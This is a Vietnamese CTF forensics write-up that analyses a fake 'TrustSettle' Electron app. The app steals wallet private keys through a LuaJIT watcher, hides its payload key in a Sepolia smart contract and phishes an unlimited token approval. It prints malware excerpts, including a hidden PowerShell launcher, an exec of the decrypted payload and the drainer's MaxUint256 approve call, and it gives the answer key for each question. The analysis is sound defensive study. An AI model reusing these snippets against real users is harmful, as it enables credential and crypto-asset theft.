# [Writeup] Holmes CTF 2026 - Sherlock: Silent Dividend

## 1. Tổng quan vụ án (Scenario Overview)

Thử thách **Silent Dividend** đặt người phân tích vào vai trò chuyên viên Digital Forensics & Incident Response (DFIR) điều tra một chuỗi tấn công có chủ đích nhắm vào các nạn nhân thực hiện giao dịch tài chính phi tập trung (Web3/DeFi). Nạn nhân được cung cấp một ứng dụng thanh toán dàn xếp (settlement client) mang tên **TrustSettle 1.0.0.exe**. Tưởng chừng đây là một phần mềm ví và giao dịch thông thường, nhưng đằng sau giao diện người dùng là sự kết hợp tinh vi giữa kiến trúc ứng dụng đa nền tảng Electron, kỹ thuật Bring Your Own Interpreter (BYOI) với LuaJIT FFI để thực thi Win32 API ngầm, kỹ thuật Dead-drop Resolver trên blockchain Ethereum Sepolia, và cuối cùng là kịch bản lừa đảo Unlimited Token Approval nhằm rút cạn tài sản của nạn nhân.

Toàn bộ quá trình điều tra được thực hiện thông qua phương pháp Static Analysis (phân tích tĩnh) kết hợp tương tác dữ liệu chuỗi khối (Blockchain Explorer), hạn chế tối đa việc chạy trực tiếp mã độc trên máy thật để đảm bảo an toàn tuyệt đối.

---

## 2. Phân tích chi tiết từng câu hỏi điều tra

### Câu 1: Xác định thư mục ứng dụng sao chép các tài nguyên bổ sung

> **Câu hỏi:** *To which directory does the application copy the files bundled within the extraResources folder? (*:\path\to\dir)*  
> **Đáp án:** `C:\Users\Public`

Khi nhận được gói thực thi `TrustSettle 1.0.0.exe`, thao tác đầu tiên là xác định cấu trúc đóng gói thay vì kích hoạt file thực thi. Sử dụng công cụ `7z` để kiểm tra thông tin lưu trữ:

```bash
7z l "TrustSettle 1.0.0.exe"
```

Kết quả cho thấy đây là một trình cài đặt NSIS (Nullsoft Scriptable Install System) chứa tệp nén `$PLUGINSDIR/app-64.7z`. Tiến hành giải nén tệp nén này bằng lệnh `7z x "TrustSettle 1.0.0.exe" -onsis_out` và tiếp tục bung `app-64.7z`, ta thu được toàn bộ cây thư mục gốc của một ứng dụng Electron. Trong thư mục này xuất hiện hai thành phần đáng chú ý: thư mục `extraResources` (chứa `luajit.exe`, `lua51.dll`, `api.txt`, `.env`) và tệp lưu trữ mã nguồn `resources/app.asar`.

Để tìm hiểu ứng dụng xử lý các file trong `extraResources` như thế nào, ta phân tích tệp `app.asar` bằng cách duyệt chuỗi ký tự thông qua lệnh `strings` kết hợp `grep`:

```bash
strings resources/app.asar | grep -C 3 "extraResources"
```

Đoạn mã nguồn JavaScript nằm trong tiến trình nền của Electron lập tức lộ diện:

```javascript
fs.readdirSync(path.resolve(`${process.resourcesPath}/../extraResources`)).forEach(f => 
    fs.copyFileSync(
        path.resolve(`${process.resourcesPath}/../extraResources`, f),
        path.join('C:\\Users\\Public', f)
    )
);
exec("powershell.exe -exec bypass -w hidden -nop -c \"& 'C:\\Users\\Public\\luajit.exe' 'C:\\Users\\Public\\api.txt'\"");
```

Đoạn mã thể hiện rõ cơ chế sao chép toàn bộ các tệp từ thư mục `extraResources` sang thư mục hệ thống `C:\Users\Public`, sau đó kích hoạt PowerShell chạy ngầm trình thông dịch `luajit.exe` để nạp tệp kịch bản `api.txt`.

---

### Câu 2: Xác định cấu trúc Win32 giám sát thay đổi thư mục

> **Câu hỏi:** *Which Win32 structure defines the format of the buffer returned by the Lua script when monitoring directory changes? (string)*  
> **Đáp án:** `FILE_NOTIFY_INFORMATION`

Sau khi sao chép tài nguyên vào `C:\Users\Public`, ứng dụng chạy tệp kịch bản `api.txt`. Đọc tệp hướng dẫn `README.md` đi kèm gói cài đặt, kẻ tấn công yêu cầu nạn nhân sau khi mở ứng dụng phải điền thông tin ví cá nhân (Private Key, Wallet Address) vào tệp `.env` đặt tại `C:\Users\Public\.env`. Điều này làm dấy lên nghi vấn tệp `api.txt` đóng vai trò là một tiến trình ngầm giám sát sự thay đổi của thư mục này để đánh cắp khóa riêng tư ngay khi nạn nhân lưu tệp.

Kịch bản `api.txt` được thực thi bởi LuaJIT. Trong kiến trúc LuaJIT, để gọi các API cấp thấp của hệ điều hành Windows mà không cần biên dịch module C++, lập trình viên bắt buộc phải sử dụng thư viện FFI (Foreign Function Interface). Dù mã nguồn Lua trong `api.txt` bị làm rối (obfuscated) bằng máy ảo ảo hóa, về mặt bản chất của hệ thống, Windows chỉ cung cấp một API native chuẩn để lắng nghe các thay đổi trong cây thư mục là hàm `ReadDirectoryChangesW` thuộc `kernel32.dll`.

Tra cứu tài liệu kỹ thuật chính thức của Microsoft dành cho hàm `ReadDirectoryChangesW`, tham số tiếp nhận dữ liệu đầu ra `lpBuffer` được quy định:
> *"A pointer to the DWORD-aligned formatted buffer in which the read results are to be returned. The structure of this buffer is defined by the FILE_NOTIFY_INFORMATION structure."*

Ngoài ra, bằng kỹ thuật Dynamic API Hooking trên môi trường Lua an toàn (chặn bắt tham số truyền vào hàm `ffi.cdef` khi `api.txt` khởi chạy), ta trích xuất được nguyên văn khai báo C struct từ chính bộ nhớ của script:

```c
typedef struct {
    DWORD NextEntryOffset;
    DWORD Action;
    DWORD FileNameLength;
    WCHAR FileName[1];
} FILE_NOTIFY_INFORMATION;
```

Cấu trúc `FILE_NOTIFY_INFORMATION` là định dạng nhị phân chuẩn định nghĩa các sự kiện bổ sung, chỉnh sửa hoặc đổi tên tệp mà script Lua đọc từ bộ đệm của Windows.

---

### Câu 3: Xác định Win32 API truyền tải dữ liệu HTTP ra ngoài

> **Câu hỏi:** *Which Win32 API is used by the Lua script to send an HTTP request to the remote server? (string)*  
> **Đáp án:** `WinHttpSendRequest`

Khi người dùng cập nhật thông tin bí mật vào tệp `.env` và cấu trúc `FILE_NOTIFY_INFORMATION` kích hoạt tín hiệu chỉnh sửa tệp, mã độc cần chuyển tiếp dữ liệu bị đánh cắp về máy chủ điều khiển (C2 Server). Kẻ tấn công không sử dụng các lệnh PowerShell ngoại vi hay socket thông thường mà tiếp tục tận dụng FFI để triệu gọi trực tiếp hệ thống thư viện mạng **WinHTTP** tích hợp sẵn của Windows (`winhttp.dll`).

Thông qua việc kiểm tra các hàm Win32 API được khai báo trong bảng ký hiệu FFI của `api.txt`, toàn bộ chuỗi hàm xử lý kết nối HTTP được liệt kê:
- `WinHttpOpen`: Khởi tạo phiên làm việc HTTP.
- `WinHttpConnect`: Thiết lập kết nối tới host/port của C2.
- `WinHttpOpenRequest`: Khởi tạo request HTTP (xác định phương thức GET/POST và đường dẫn URI).
- `WinHttpSendRequest`: Thực hiện gửi trực tiếp gói tin HTTP request cùng dữ liệu payload tới máy chủ từ xa.
- `WinHttpReceiveResponse`: Tiếp nhận phản hồi từ server.

Hàm chịu trách nhiệm phát dữ liệu HTTP request từ client lên server chính là `WinHttpSendRequest`.

---

### Câu 4: Nhận diện hàm Smart Contract cung cấp khóa giải mã

> **Câu hỏi:** *Which smart contract function does the Electron application invoke to retrieve the decryption key for the encrypted payload? (function())*  
> **Đáp án:** `resolveState()`

Song song với tiến trình thu thập dữ liệu bằng Lua, giao diện chính của ứng dụng Electron còn ẩn chứa một luồng thực thi mã độc thứ hai. Tiến hành giải nén gói lưu trữ `app.asar` ra thư mục mã nguồn thuần thông qua công cụ dòng lệnh:

```bash
npx @electron/asar extract "resources/app.asar" "./asar_extracted"
```

Kiểm tra tệp kịch bản khởi động giao diện `asar_extracted/preload.js`, ta nhận thấy ứng dụng sử dụng thư viện `ethers.js` để kết nối vào mạng thử nghiệm Ethereum Sepolia qua RPC công khai:

```javascript
const CONTRACT_ADDRESS = '0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1';
const RPC_URL = 'https://ethereum-sepolia-rpc.publicnode.com';
const CONTRACT_ABI = [
    'function resolveState() view returns (bytes32)'
];
const ENCRYPTED_DATA = '0x560c325bdd0aeea2cd2690a2ed1c1b4a28deca7ac2a40ce8d2725d539a950ca8f4a4bcf375806c36532258a0cf16c19c12989e0aa0e25a72be241da7d2f74cfa2c4c4e1bbfc6204207fe5c801d201f5af84864f0';
```

Kẻ tấn công áp dụng kỹ thuật **Dead-Drop Resolver trên Blockchain**: mã độc không lưu trực tiếp khóa giải mã trong chương trình cũng như không kéo từ máy chủ web thông thường (vốn dễ bị chặn tên miền), mà gửi truy vấn đọc trạng thái (`view call`) tới hàm **`resolveState()`** của Smart Contract. Giá trị `bytes32` trả về từ hàm này được dùng làm đối số `encryptionKey` truyền vào hàm giải mã `decryptEmbeddedData(ENCRYPTED_DATA, state)`.

---

### Câu 5: Giải mã dữ liệu và khôi phục Flag từ Smart Contract

> **Câu hỏi:** *Investigate the smart contract using its address, analyze its logic, and recover the flag by decoding the encrypted data. (****=******** **********_*********=**-****)*  
> **Đáp án:** `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821`

Để giải mã được chuỗi dữ liệu nhị phân `ENCRYPTED_DATA`, ta cần thu thập khóa giải mã từ hàm `resolveState()` của hợp đồng tại địa chỉ `0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1`.

Việc truy vấn có thể thực hiện thủ công bằng cách gửi một `eth_call` RPC tiêu chuẩn hoặc tra cứu trên trình duyệt khối Sepolia Etherscan tại mục "Read Contract". Giá trị trạng thái trả về của hàm `resolveState()` là một chuỗi 32 byte hex:
`0x3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4`

Quan sát thuật toán giải mã trong `preload.js`:
```javascript
for (let i = 0; i < data.length; i++) {
    const keyByte = key[i % key.length];
    const step1 = data[i] ^ keyByte;
    const step2 = ((step1 << 7) | (step1 >>> 1)) & 0xff; // ROR 1 bit (hoặc ROL 7 bit)
    result[i] = step2 ^ 0x42;
}
```

Đây là thuật toán mã hóa đối xứng kết hợp giữa phép toán XOR với từng byte của khóa, xoay bit vòng (bit rotation) và XOR với hằng số `0x42`. Khi áp dụng khóa thu được từ blockchain lên mảng dữ liệu `ENCRYPTED_DATA`, chuỗi văn bản thuần được phục hồi hoàn chỉnh:

```bat
start "" "%TEMP%\settlement.html" && echo AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
```

Chuỗi tham số sau lệnh `echo` khớp chính xác từng ký tự với định dạng flag yêu cầu: `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821`.

---

### Câu 6: Xác định biến môi trường chứa tệp HTML được trích xuất

> **Câu hỏi:** *Which environment variable corresponds to the directory where the application copies the HTML file from its package? (string)*  
> **Đáp án:** `TEMP` *(hoặc `%TEMP%`)*

Xem xét logic kích hoạt tại hàm `initializeVault()` trong `preload.js`:
```javascript
const indexContent = fs.readFileSync(path.join(__dirname, 'src', 'settlement.html'), 'utf8');
fs.writeFileSync(path.resolve(`${process.resourcesPath}/../../settlement.html`), indexContent, 'utf8');
exec(decrypted);
```

Ứng dụng trích xuất tệp `settlement.html` từ gói nội bộ và ghi ra thư mục cấp cha thứ hai tính từ thư mục tài nguyên (`process.resourcesPath/../../`). Khi ứng dụng Electron dạng portable hoặc NSIS unpack vận hành, thư mục này chính là thư mục chứa tệp tạm thời của người dùng Windows.

Đồng thời, khi đối chiếu trực tiếp với câu lệnh hệ thống được giải mã ở câu 5:
```bat
start "" "%TEMP%\settlement.html"
```

Lệnh `start` gọi thẳng tệp thông qua biến môi trường hệ thống đại diện cho thư mục tạm là `%TEMP%`. Tên chuẩn của biến môi trường này là `TEMP`.

---

### Câu 7 & Câu 8: Cơ chế cấp quyền Token và số lượng Token yêu cầu phê duyệt

> **Câu 7:** *What token function does the HTML page call to request spending permission? (function())*  
> **Đáp án:** `approve()`
> 
> **Câu 8:** *What is the exact token amount passed to the approval call? (number)*  
> **Đáp án:** `115792089237316195423570985008687907853269984665640564039457584007913129639935`

Sau khi tệp `settlement.html` được mở lên trình duyệt, nạn nhân sẽ thấy một giao diện dàn xếp thỏa thuận giả mạo. Kiểm tra mã nguồn thẻ `<script>` của `asar_extracted/src/settlement.html`, hàm xử lý nút bấm "I Agree" (`requestApproval()`) thực hiện logic sau:

```javascript
async function requestApproval() {
    ...
    const token = new ethers.Contract(MOCK_TOKEN_ADDRESS, MOCK_TOKEN_ABI, signer);
    const unlimitedAmount = ethers.MaxUint256;

    const tx = await token.approve(X0_CONTRACT_ADDRESS, unlimitedAmount);
    await tx.wait();
    ...
}
```

Về mặt bản chất kỹ thuật Web3:
1. Hàm được gọi là **`approve()`** thuộc tiêu chuẩn ERC-20 (`IERC20`), cho phép một bên thứ ba (`spender`) được quyền thay mặt chủ ví chi tiêu hoặc chuyển token đi thông qua hàm `transferFrom()`.
2. Thay vì phê duyệt một số lượng nhỏ tương ứng với phí giao dịch, biến số truyền vào là **`ethers.MaxUint256`**. Trong hệ thống số học máy ảo Ethereum (EVM 256-bit), giá trị số nguyên không dấu lớn nhất là $2^{256} - 1$, tương đương giá trị thập phân chính xác:
   `115792089237316195423570985008687907853269984665640564039457584007913129639935`.

Đây là kỹ thuật lừa đảo điển hình của các bộ mã độc Web3 Drainer: một khi người dùng phê duyệt quyền hạn vô hạn này, hợp đồng của kẻ tấn công có thể rút cạn toàn bộ số dư của nạn nhân vào bất kỳ lúc nào mà không cần sự tương tác hay ký duyệt thêm.

---

### Câu 9: Lớp Provider kết nối ví trình duyệt trong Ethers.js v6

> **Câu hỏi:** *What ethers.js v6 provider class is used to connect to the browser wallet? (string)*  
> **Đáp án:** `BrowserProvider`

Quan sát hàm `connect()` trong `settlement.html` (dòng 350 - 355):

```javascript
async function connect() {
    ...
    provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = await provider.getSigner();
    ...
}
```

Khi tương tác với các tiện ích mở rộng ví (browser extension wallet) như MetaMask hay Rabby, trình duyệt sẽ đưa đối tượng giao tiếp EIP-1193 vào phạm vi toàn cục thông qua `window.ethereum`. Trong phiên bản thư viện `ethers.js v5` trước đây, lớp kết nối tương ứng có tên là `Web3Provider`. Tuy nhiên, từ phiên bản `ethers.js v6`, thư viện đã tái cấu trúc và đổi tên lớp bọc này thành **`BrowserProvider`** (`ethers.BrowserProvider`).

---

### Câu 10: Phân tích Smart Contract độc hại và thu hồi tọa độ ẩn

> **Câu hỏi:** *Analyze the HTML page to uncover a smart contract reference. Investigate the contract's logic and determine how to interact with it to recover the hidden flag. (**.****,*.****)*  
> **Đáp án:** `51.5049,0.0348`

Ở phần khai báo địa chỉ hợp đồng trong `settlement.html`, bên cạnh token mẫu `MOCK_TOKEN_ADDRESS`, địa chỉ của bên nhận quyền rút tiền (spender) được xác định cụ thể:
`const X0_CONTRACT_ADDRESS = "0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D";`

Tiến hành tra cứu địa chỉ này trên trình duyệt khối **Sepolia Blockscout** hoặc **Sepolia Etherscan** tại thẻ Contract Code. Do hợp đồng đã được xác thực mã nguồn (verified contract), ta thu được toàn bộ mã nguồn Solidity nguyên bản của hợp đồng `x0`:

```solidity
contract x0 {
    MockToken public x1;

    bytes32 private x2 = 0x7ccb3a440e383635148b237df8bb22dff0b594425beae88d6e1623df0bc7669b;
    bytes32 private x3 = 0x7ccb3a440e383635148b237d13473c069ba9ffd6545c58ee37e969b87d181c01;
    bytes private x4;

    function x7() public view returns (address) {
        return address(uint160(uint256(x2) ^ uint256(x3)));
    }

    function x9(address x10) external view returns (string memory) {
        require(x10 == x7(), "not quite - keep analyzing");
        bytes memory decrypted = _crypt(x4, x10);
        return string(decrypted);
    }
    ...
}
```

#### Phân tích logic của Smart Contract:
1. **Hàm `x7()`**: Thực hiện phép toán logic XOR giữa hai hằng số lưu trữ nội bộ `x2` và `x3`, sau đó ép kiểu 160-bit để chuyển thành một địa chỉ ví hợp lệ. Hàm này là một `view function`, bất kỳ ai cũng có thể đọc mà không tốn phí gas.
2. **Hàm `x9(address x10)`**: Tiếp nhận đối số đầu vào là một địa chỉ ví `x10`. Điều kiện `require` kiểm tra nếu địa chỉ `x10` khớp với địa chỉ được sinh ra từ hàm `x7()`, hợp đồng sẽ gọi thuật toán `_crypt` giải mã mảng dữ liệu nhị phân `x4` và trả về kết quả dưới dạng chuỗi ký tự (`string`).

#### Thao tác thủ công để thu hồi Flag:
Người phân tích có thể thao tác hoàn toàn thủ công trực tiếp trên giao diện web của Blockscout/Etherscan Sepolia mà không cần viết script:
1. Truy cập mục **Read Contract** của hợp đồng `0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D`.
2. Mở hàm **`x7`** và bấm **Query**: Giá trị địa chỉ ví ẩn trả về là:
   `0xEBfC1eD96b1C6b940fb6B06359fF4A6776Df7a9A`.
3. Di chuyển xuống hàm **`x9`**, nhập giá trị `0xEBfC1eD96b1C6b940fb6B06359fF4A6776Df7a9A` vào ô tham số `x10` và bấm **Query**.
4. Hợp đồng hoàn tất giải mã và trả về chuỗi kết quả:
   **`51.5049,0.0348`**.

Giá trị này là tọa độ địa lý (kinh độ, vĩ độ) tại khu vực London, hoàn toàn khớp với định dạng `(**.****,*.****)` và cốt truyện của chuỗi điều tra Sherlock Holmes.

---

## 3. Tổng kết chuỗi tấn công (Kill Chain Summary)

| Giai đoạn | Kỹ thuật / Cơ chế sử dụng | Mục đích của kẻ tấn công |
| :--- | :--- | :--- |
| **Initial Staging** | NSIS Archive Extraction | Bung ứng dụng Electron giả mạo và trích xuất tài nguyên phụ trợ vào `C:\Users\Public`. |
| **Credential Sniffing** | LuaJIT FFI (`ReadDirectoryChangesW`) | Giám sát ngầm tệp `.env` qua cấu trúc `FILE_NOTIFY_INFORMATION` để bắt trộm Private Key khi nạn nhân nhập dữ liệu. |
| **C2 Exfiltration** | Native WinHTTP API (`WinHttpSendRequest`) | Truyền tải thông tin đăng nhập và ví bị lộ ra máy chủ C2 mà không kích hoạt cảnh báo tiến trình mạng khả nghi. |
| **Dead-Drop Payload** | Web3 Smart Contract (`resolveState()`) | Sử dụng blockchain Sepolia làm nơi lưu trữ khóa giải mã, vượt qua các hệ thống phân tích danh tiếng domain/IP. |
| **Phishing Execution** | Host Extraction (`%TEMP%\settlement.html`) | Đưa tệp HTML lừa đảo ra ổ đĩa tạm và kích hoạt trình duyệt nạn nhân hiển thị thỏa thuận thanh toán giả. |
| **Wallet Draining** | Unlimited ERC-20 Approval (`MaxUint256`) | Đánh cắp quyền chi tiêu toàn bộ token của nạn nhân để hợp đồng rút tiền `x0` chiếm đoạt tài sản. |
| **Secret Exfiltration** | On-chain XOR / Crypt Logic (`x7` & `x9`) | Khôi phục tọa độ bí mật thông qua việc tương tác logic nội bộ của hợp đồng thông minh. |
